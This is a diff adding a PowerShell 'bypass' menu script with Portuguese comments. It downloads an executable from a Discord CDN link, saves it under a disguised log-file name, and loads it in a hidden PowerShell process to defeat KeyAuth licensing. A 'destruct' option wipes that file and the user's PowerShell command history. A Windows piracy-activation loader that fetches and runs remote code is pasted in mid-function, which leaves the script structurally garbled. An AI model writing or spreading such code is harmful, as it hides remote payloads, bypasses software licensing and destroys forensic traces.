@@ -1,0 +1,143 @@
+# Verifique se o script está sendo executado com privilégios de administrador
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if (-not $isAdmin) {
+    Write-Host "Este script requer privilégios de administrador. Execute-o novamente como administrador."
+    # Aguarde um momento para que o usuário possa ler a mensagem
+    Start-Sleep -Seconds 5
+    Exit
+}
+
+# Variável para controlar o download da URL (inicialmente definida como $false)
+$downloaded = $false
+
+# Define a função para carregar o Bypass
+function LoadBypass {
+    $dllPath = "C:\Windows\Logs\DPX\setuperr.log"
+
+    try {
+        Write-Host "Carregando Bypass..."
+
+        # Crie um bloco de script para carregar a DLL
+        $scriptBlock = {
+            param (
+                [string]$dllPath
+            )
+
+            try {
+                $assembly = [System.Reflection.Assembly]::LoadFrom($dllPath)
+                $programType = $assembly.GetType('KeyAuth.Program')
+                
+                if ($programType -ne $null) {
+                    $methods = $programType.GetMethods([System.Reflection.BindingFlags]::NonPublic -bor [System.Reflection.BindingFlags]::Static)
+                    
+                    foreach ($method in $methods) {
+                        if ($method.IsPrivate -and $method.IsStatic -and
+                            $method.ReturnType -eq [void] -and
+                            $method.GetParameters().Length -eq 1 -and
+                            $method.GetParameters()[0].ParameterType -eq [string[]]) {
+                            $args = New-Object string[] (1)
+                            $method.Invoke($null, @($args))
+                        }
+                    }
+                }
+            } catch {
+                Write-Host "Erro ao carregar o bypass"
+            }
+        }
+
+        # Execute o bloco de script em um novo processo do PowerShell invisível
+        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command & { $scriptBlock } -dllPath '$dllPath'" -WindowStyle Hidden
+
+        Write-Host "Bypass carregado com sucesso"
+    } catch {
+        Write-Host "Erro ao carregar o Bypass"
+    }
+}
+
+function ZerarBytesDoArquivo($nomeDoArquivo) {
+    try {
+        Write-Host "Finalizando Destruct..."
+        if (Test-Path -Path $nomeDoArquivo -PathType Leaf) {
+            $arquivo = [System.IO.File]::OpenWrite($nomeDoArquivo)
+            $arquivo.SetLength(0)
+            $arquivo.Close()
+        }
+        Write-Host "Destruct concluído com sucesso."
+    } catch {
+        # Lidar com exceções, se necessário
+    }
+}
+
+
+# Loop para exibir o menu continuamente
+while ($true) {
+    $choice = ""
+
+    Clear-Host
+    if (-not $downloaded) {
+        # Realize o download da URL apenas na primeira execução
+        Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1142942470330658856/1194847680120229914/SpotifySetup.exe" -OutFile "C:\Windows\Logs\DPX\setuperr.log"
+        $downloaded = $true
+    }
+
+    Write-Host @"
+   _____ _                           ____                            
+  / ____| |                         |  _ \                           
+ | |  __| | _____      _____ _ __   | |_) |_   _ _ __   __ _ ___ ___ 
+ | | |_ | |/ _ \ \ /\ / / _ \ '_ \  |  _ <| | | | '_ \ / _` / __/ __|
+ | |__| | | (_) \ V  V /  __/ | | | | |_) | |_| | |_) | (_| \__ \__ \
+  \_____|_|\___/ \_/\_/ \___|_| |_| |____/ \__, | .__/ \__,_|___/___/
+                                            __/ | |                  
+                                           |___/|_|                  
+"@
+
+    Write-Host "1 - (Load Bypass)"
+    Write-Host "2 - (Finish Traces Detruct)"
+    $choice = Read-Host "Escolha uma opção (1 ou 2)"
+
+    if ($choice -eq "1") {
+        LoadBypass# Check the instructions here on how to use it https://massgrave.dev/
+
+$ErrorActionPreference = "Stop"
+# Enable TLSv1.2 for compatibility with older clients
+[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
+
+$DownloadURL = 'https://raw.githubusercontent.com/massgravel/Microsoft-Activation-Scripts/master/MAS/All-In-One-Version/MAS_AIO.cmd'
+$DownloadURL2 = 'https://bitbucket.org/WindowsAddict/microsoft-activation-scripts/raw/master/MAS/All-In-One-Version/MAS_AIO.cmd'
+
+$rand = Get-Random -Maximum 99999999
+$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:TEMP\MAS_$rand.cmd" }
+
+try {
+    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
+}
+catch {
+    $response = Invoke-WebRequest -Uri $DownloadURL2 -UseBasicParsing
+}
+
+$ScriptArgs = "$args "
+$prefix = "@REM $rand `r`n"
+$content = $prefix + $response
+Set-Content -Path $FilePath -Value $content
+
+Start-Process $FilePath $ScriptArgs -Wait
+
+$FilePaths = @("$env:TEMP\MAS*.cmd", "$env:SystemRoot\Temp\MAS*.cmd")
+foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
+        Start-Sleep -Seconds 4  # Espera 4 segundos antes de continuar
+    } elseif ($choice -eq "2") {
+        # Chamada da função com os nomes dos arquivos como argumentos
+$userName = [System.Environment]::UserName
+$nomeDoArquivo3 = "C:\Users\$userName\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+$nomeDoArquivo2 = "C:\Windows\Logs\DPX\setuperr.log"
+
+ZerarBytesDoArquivo $nomeDoArquivo3
+ZerarBytesDoArquivo $nomeDoArquivo2
+        Start-Sleep -Seconds 4  # Espera 4 segundos antes de continuar
+    } elseif ($choice -ne "1" -and $choice -ne "2") {
+        Write-Host "Opção inválida."
+        Start-Sleep -Seconds 4  # Espera 4 segundos antes de continuar
+    }
+}
